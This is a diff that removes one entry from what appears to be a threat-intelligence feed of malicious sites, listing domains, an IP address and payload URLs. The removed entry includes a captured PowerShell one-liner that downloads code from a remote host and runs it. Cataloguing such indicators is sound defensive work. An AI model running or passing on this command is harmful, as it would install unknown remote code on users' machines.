@@ -7122,35 +7122,5 @@
     ],
     "ReportId": "cmwbg1jw206qq0nmlz0huek8f",
     "ScannedAt": "2026-11-11T01:31:58.863000+00:00"
-  },
-  {
-    "UrlDomain": "safeskill.co.za",
-    "DeliveryUrl": [
-      "browse-nnccodes.beer"
-    ],
-    "PayloadUrl": [],
-    "IP": [
-      "197.242.65.12"
-    ],
-    "Related": [
-      {
-        "Value": "https://browse-nnccodes.beer/d6635ac514ec3dc5",
-        "Type": "payload download"
-      },
-      {
-        "Value": "https://browse-nnccodes.beer/api.php?s=8402fb1338daab6a166e91aa8c92a20798acfa98fb75c5a2&amp;_v=29905997",
-        "Type": "Reference"
-      },
-      {
-        "Value": "https://browse-nnccodes.beer/api.php?s=8402fb1338daab6a166e91aa8c92a20798acfa98fb75c5a2&amp;_v=29905998",
-        "Type": "Reference"
-      }
-    ],
-    "Payload": "irm 'browse-nnccodes.beer/d6635ac514ec3dc5'|iex;",
-    "ResolvedDownloadUrl": [
-      "https://browse-nnccodes.beer/d6635ac514ec3dc5"
-    ],
-    "ReportId": "cmwbfkpep06i70nml6przoq86",
-    "ScannedAt": "2026-11-11T01:18:52.837000+00:00"
   }
 ]
